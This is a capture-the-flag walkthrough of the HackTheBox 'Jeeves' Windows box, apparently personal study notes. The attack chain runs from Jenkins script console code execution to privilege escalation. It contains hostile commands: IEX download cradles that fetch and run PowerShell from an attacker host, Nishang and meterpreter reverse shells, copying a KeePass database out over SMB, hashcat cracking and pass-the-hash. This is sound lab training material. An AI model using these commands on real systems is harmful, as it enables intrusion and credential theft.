2018 (old)

Discover two web apps. Use gobuster to discover /askjeeves directory. Use jenkins script console to get code execution/ initial access using Nishang reverse shell. Discover KeePass database and use keepass2john to extract database hash, crack hash, and pass the hash using pth-winexe to escalate privileges. 
### NMAP

```
sudo nmap -sC -sV -oN nmap-jeeves 10.10.10.63
```

![[HackTheBox/Windows/attachments/Pasted image 20250519220133.png]]
- 80, 135, 445, 50000

### Enumerate websites

10.10.10.63

10.10.10.63:50000
![[HackTheBox/Windows/attachments/Pasted image 20250519220315.png]]

### Initial Access

Exploit Jenkins script console (Groovy) to gain code execution. 

1. Modify Nishang's [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) with our IP and port.

2. Serve up the reverse shell using #pythonhttpserver over port 80
![[HackTheBox/Windows/attachments/Pasted image 20250520211333.png]]
3. Set up nc listener 
4. Then in the JSC, download the reverse shell
![[HackTheBox/Windows/attachments/Pasted image 20250520211546.png]]
5. Catch the reverse shell 

### Enumerate for Priv Esc 

#### PowerUp
Download [dev branch of PowerSploit ](https://github.com/PowerShellMafia/PowerSploit/tree/dev)

```
git clone https://github.com/PowerShellMafia/PowerSploit.git -b dev
```

Set up #pythonhttpserver to grab PowerUp  

```
/PowerSploit/Privesc/PowerUp.ps1
```

Download PowerUp

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.30/PowerSploit/Privesc/PowerUp.ps1')
```

Run PowerUp
```
Invoke-AllChecks
```

![[HackTheBox/Windows/attachments/Pasted image 20250520212343.png]]

##### PowerUp Results 

Found SeImpersonatePrivilege -> RottenPotatoes is going to work!
![[HackTheBox/Windows/attachments/Pasted image 20250520212632.png]]

#### Enumerating file system 

Found KeePass database CEH.kdbx in Documents folder 

![[HackTheBox/Windows/attachments/Pasted image 20250520212921.png]]

#### Transfer CEH.kdbx using SMB 

On Kali box
```
impacket-smbserver PleaseSubscribe `pwd`
```

On Target box 
```
New-PSDrive -Name "NameofDrive" -PSProvider "FileSystem" -Root "\\10.10.14.30\NameofShare"
```

Change into drive on target box
```
cd NameofDrive
```

Copy file to transfer into the directory 
```
cp C:\Windows\kohsuke\Documents\CEH.kdbx .
```

Access the file locally 
![[HackTheBox/Windows/attachments/Pasted image 20250520213946.png]]


#### Use KeePass2John to Obtain KeePass Database hash

```
keepass2john CEH.kdbx
```

![[HackTheBox/Windows/attachments/Pasted image 20250520214318.png]]

Lookup hash mode for KeePass 
[Hash modes](https://hashcat.net/wiki/doku.php?id=example_hashes)

We have KeePass 2 AES / without key file (13400)

Crack the hash using rockyou wordlist

```
./hashcat -m 13400 jeeves-keepass.hash /usr/share/wordlist/rockyou.txt
```

Got the password to the database: moonshine1

Some passwords and an NTLM hash within
![[HackTheBox/Windows/attachments/Pasted image 20250520215222.png]]

### Priv Esc
#### Method - Pass the Hash 
Use [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit/tree/master) 
```
pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe
```
![[HackTheBox/Windows/attachments/Pasted image 20250520215339.png]]

View root flag hidden via Alternate Data Streams (ADS)
```
dir /r
```

![[HackTheBox/Windows/attachments/Pasted image 20250520220129.png]]

##### Method - SeImpersonate 

Detection 
```
whoami /priv
```

[Resource for Rotten Potato ](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

[Tokens for Priv Esc ](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)

Use [Unicorn](https://github.com/trustedsec/unicorn) to get MSF Shell 

Use PS Example 

```
python unicorn.py windows/meterpreter/reverse_https 10.10.14.30 443
```

![[HackTheBox/Windows/attachments/Pasted image 20250521192135.png]]

Generated reverse shell code in powershell_attack.txt -> rename to msf.txt

Move this file and unicorn.rc file to web server directory 

![[HackTheBox/Windows/attachments/Pasted image 20250521192344.png]]

Move unicorn.rc file to msf directory and start metasploit 

```
msfconsole -r unicorn.rc
```

Grab rotten potato .exe file from [GitHub](https://github.com/foxglovesec/RottenPotato)

Unicorn.rc is basically metasploit listener 

![[HackTheBox/Windows/attachments/Pasted image 20250521192754.png]]

On target box -> download the msf.txt 

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.30/msf.txt')
```

Get meterpreter session 

![[HackTheBox/Windows/attachments/Pasted image 20250521193056.png]]

```
sessions -i 1
```

Enter shell 
```
shell
```

```
whoami /priv
```

```
exit
```

```
load incognito
```

Execute rotten potato.exe 
```
execute -cH -f rottenpotato.exe
```

List tokens 
```
list_tokens -g
```
![[HackTheBox/Windows/attachments/Pasted image 20250521193605.png]]

Impersonate administrative user token 
```
impersonate_token "BUILTIN\\Administrators"
```

![[HackTheBox/Windows/attachments/Pasted image 20250521193518.png]]

⭐got root⭐